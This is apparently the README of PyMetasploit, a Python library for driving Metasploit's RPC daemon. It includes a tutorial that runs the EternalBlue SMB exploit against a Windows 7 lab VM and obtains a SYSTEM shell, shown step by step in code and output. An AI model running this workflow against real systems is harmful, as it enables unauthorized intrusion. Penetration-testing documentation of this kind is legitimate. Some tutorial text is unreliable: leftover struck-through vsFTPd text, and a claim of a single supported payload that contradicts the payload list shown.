PyMetasploit - a full-fledged msfrpc library for Python
-------------------------------------------------------

PyMetasploit is a full-fledged `msfrpc` library for Python. It is meant to interact with the msfrpcd daemon that comes
with the latest versions of Metasploit. It does NOT interact with the console-based scripts that Metasploit provides
such as msfconsole, msfvenom, etc. Therefore, before you can begin to use this library, you'll need to initialize
`msfrpcd` and optionally (highly recommended) PostgreSQL.

# Requirements

Before we begin, you'll need to install the following components:

* **Metasploit:** https://github.com/rapid7/metasploit-framework
* **PostgreSQL (Optional):** http://www.postgresql.org

Installing PostgreSQL is highly recommended as it will improve response times when querying `msfrpcd` (Metasploit RPC
daemon) for module information.

# Tutorial

## Starting `msfrpcd`

`msfrpcd` accepts the following arguments:

```bash
$ ./msfrpcd -h

   Usage: msfrpcd <options>

   OPTIONS:

       -P <opt>  Specify the password to access msfrpcd
       -S        Disable SSL on the RPC socket
       -U <opt>  Specify the username to access msfrpcd
       -a <opt>  Bind to this IP address
       -f        Run the daemon in the foreground
       -h        Help banner
       -n        Disable database
       -p <opt>  Bind to this port instead of 55553
       -u <opt>  URI for Web server
```

The only parameter that is required to launch `msfrpcd` is the `-P` (password) parameter. This specifies the password
that will be used to authenticate users to the daemon. As of this writing, `msfrpcd` only supports one username/password
combination. However, the same user can log into the daemon multiple times. Unless specified otherwise, the `msfrpcd`
daemon listens on port 55553 on all interfaces (`0.0.0.0:55553`).

For the purposes of this tutorial let's start the `msfrpcd` daemon with a minimal configuration:

```bash
$ ./msfrpcd -P mypassword -n -f -a 127.0.0.1
[*] MSGRPC starting on 0.0.0.0:55553 (SSL):Msg...
[*] MSGRPC ready at 2014-04-19 23:49:39 -0400.
```

The `-f` parameter tells `msfrpcd` to remain in the foreground and the `-n` parameter disables database support.
Finally, the `-a` parameter tells `msfrcpd` to listen for requests only on the local loopback interface (`127.0.0.1`).

## `MsfRpcClient` - Brief Overview

### Connecting to `msfrpcd`

Let's get started interacting with the Metasploit framework from python:

```python
>>> from metasploit.msfrpc import MsfRpcClient
>>> client = MsfRpcClient('mypassword')
or
>>> client = MsfRpcClient('mypassword', server="127.0.0.1", port="55553", username="msf", ssl=False)
```

The `MsfRpcClient` class provides the core functionality to navigate through the Metasploit framework. Let's take a
look at its underbelly:

```python
>>> [m for m in dir(client) if not m.startswith('_')]
['auth', 'authenticated', 'call', 'client', 'consoles', 'core', 'db', 'jobs', 'login', 'logout', 'modules', 'plugins', 'port', 'server', 'sessionid', 'sessions', 'ssl', 'uri', 'verify_ssl']
>>>
```

Like the metasploit framework, `MsfRpcClient` is segmented into different management modules:

* **`auth`**: manages the authentication of clients for the `msfrpcd` daemon.
* **`consoles`**: manages interaction with consoles/shells created by Metasploit modules.
* **`core`**: manages the Metasploit framework core.
* **`db`**: manages the backend database connectivity for `msfrpcd`.
* **`modules`**: manages the interaction and configuration of Metasploit modules (i.e. exploits, auxiliaries, etc.)
* **`plugins`**: manages the plugins associated with the Metasploit core.
* **`sessions`**: manages the interaction with Metasploit meterpreter sessions.

### Running an Exploit

Just like the Metasploit console, you can retrieve a list of all the modules that are available. Let's take a look at
what exploits are currently loaded:

```python
>>> client.modules.exploits
['hpux/lpd/cleanup_exec', 'dialup/multi/login/manyargs', 'aix/rpc_ttdbserverd_realpath', 'aix/rpc_cmsd_opcode21', 'aix/local/ibstat_path', ...
'android/fileformat/adobe_reader_pdf_js_interface', 'linux/smtp/haraka']
>>>
```

We can also retrieve a list of `auxiliary`, `encoders`, `nops`, `payloads`, and `post` modules using the same syntax:

```python
>>> client.modules.auxiliary
...
>>> client.modules.encoders
...
>>> client.modules.nops
...
>>> client.modules.payloads
...
>>> client.modules.post
...
```

Now let's interact with one of the `exploit` modules:

```python
>>> exploit = client.modules.use('exploit', 'windows/smb/ms17_010_eternalblue')
>>>
```

If all is well at this point, you will be able to query the module for various pieces of information such as author,
description, required run-time options, etc. Let's take a look:

```python
>>>  print(exploit.description)

This module is a port of the Equation Group ETERNALBLUE exploit, part of the FuzzBunch toolkit released by Shadow Brokers. There is a buffer overflow memmove operation in Srv!SrvOs2FeaToNt. The size is calculated in Srv!SrvOs2FeaListSizeToNt, with mathematical error where a DWORD is subtracted into a WORD. The kernel pool is groomed so that overflow is well laid-out to overwrite an SMBv1 buffer. Actual RIP hijack is later completed in srvnet!SrvNetWskReceiveComplete. This exploit, like the original may not trigger 100% of the time, and should be run continuously until triggered. It seems like the pool will get hot streaks and need a cool down period before the shells rain in again. The module will attempt to use Anonymous login, by default, to authenticate to perform the exploit. If the user supplies credentials in the SMBUser, SMBPass, and SMBDomain options it will use those instead. On some systems, this module may cause system instability and crashes, such as a BSOD or a reboot. This may be more likely with some payloads.

>>> exploit.authors
[b'Sean Dillon <sean.dillon@risksense.com>', b'Dylan Davis <dylan.davis@risksense.com>', b'Equation Group', b'Shadow Brokers', b'thelightcosine']
>>> exploit.options
dict_keys(['TCP::send_delay', 'EnableContextEncoding', 'MaxExploitAttempts', 'GroomAllocations', 'SSLVerifyMode', 'RPORT', 'DCERPC::fake_bind_multi_append', 'SMBUser', 'DCERPC::smb_pipeio', 'DCERPC::fake_bind_multi_prepend', 'VerifyArch', 'ContextInformationFile', 'DCERPC::ReadTimeout', 'ConnectTimeout', 'GroomDelta', 'DCERPC::fake_bind_multi', 'TCP::max_send_size', 'SSLCipher', 'CHOST', 'RHOST', 'SMBPass', 'Proxies', 'SMBDomain', 'VerifyTarget', 'WfsDelay', 'WORKSPACE', 'DisablePayloadHandler', 'SSLVersion', 'VERBOSE', 'DCERPC::max_frag_size', 'ProcessName', 'CPORT', 'SSL'])
>>> exploit.required # Required options
['MaxExploitAttempts', 'GroomAllocations', 'RPORT', 'VerifyArch', 'DCERPC::ReadTimeout', 'ConnectTimeout', 'GroomDelta', 'RHOST', 'VerifyTarget', 'SSLVersion', 'DCERPC::max_frag_size', 'ProcessName']
```

~~That's all fine and dandy but you're probably really itching to pop a box with this library right now, amiright!? Let's
do it! Let's use a [Metasploitable 2](http://sourceforge.net/projects/metasploitable/) instance running on a VMWare
machine as our target. Luckily it's running our favorite version of vsFTPd - 2.3.4 - and we already have our exploit
module loaded in PyMetasploit. Our next step is to specify our target:~~  
The victim is "win7x64 pro sp1". You can also try it on x86 vm - https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/

```python
>>> exploit['RHOST'] = '192.168.1.11' # IP of our target host
>>>
```

You can also specify or retrieve other options as well, as long as they're listed in `exploit.options`, using the same
method as shown above. For example, let's get and set the `VERBOSE` option:

```python
>>> exploit['VERBOSE']
False
>>> exploit['VERBOSE'] = True
>>> exploit['VERBOSE']
True
>>>
```

Awesome! So now we're ready to execute our exploit. All we need to do is select a payload:

```python
>>> exploit.payloads
['generic/custom', 'generic/shell_bind_tcp', ...
, 'windows/x64/vncinject/reverse_winhttps']
>>>
```

At this point, this exploit only supports one payload (`generic/shell_bind_tcp`). So let's pop a shell:

```python
>>> exploit.execute(payload='generic/shell_bind_tcp')
{'uuid': 'cyjpfhww', 'job_id': 0}
>>>
```

Excellent! It looks like our exploit ran successfully. How can we tell? The `job_id` key contains a number. If the
module failed to execute for any reason, `job_id` would be `None`. For long running modules, you may want to poll the
job list by checking `client.jobs.list`. Since this is a fairly quick exploit, the job list will most likely be empty
and if we managed to pop our box, we might see something nice in the sessions list:

```python
>>> client.sessions.list
{'1': {'session_port': 445, 'exploit_uuid': 'cyjpfhww', 'username': 'root', 'type': 'shell', 'desc': 'Command shell', 'via_payload': 'payload/generic/shell_bind_tcp', 'uuid': 'bkttoqtn', 'workspace': 'false', 'routes': '', 'tunnel_peer': '192.168.1.11:4444', 'session_host': '192.168.1.11', 'info': 'Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation.  All rights reserved. C:\\Windows\\system32>', 'tunnel_local': '192.168.1.21:33391', 'target_host': '192.168.1.11', 'via_exploit': 'exploit/windows/smb/ms17_010_eternalblue', 'arch': 'x64'}}
>>>
```

Success! We managed to pop the box! `client.sessions.list` shows us that we have a live session with the same `uuid` as
the one we received when executing the module earlier (`exploit.execute()`). Let's interact with the shell:

```python
>>> shell = client.sessions.session(1)
>>> shell.write('whoami\n')
>>> print(shell.read())
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>
>>> # Happy dance!
```

This is just a sample of how powerful PyMetasploit can be. Use your powers wisely, Grasshopper, because with great power
comes great responsibility – unless you are a banker.

# Questions?

Email me at ndouba.at.gmail.com
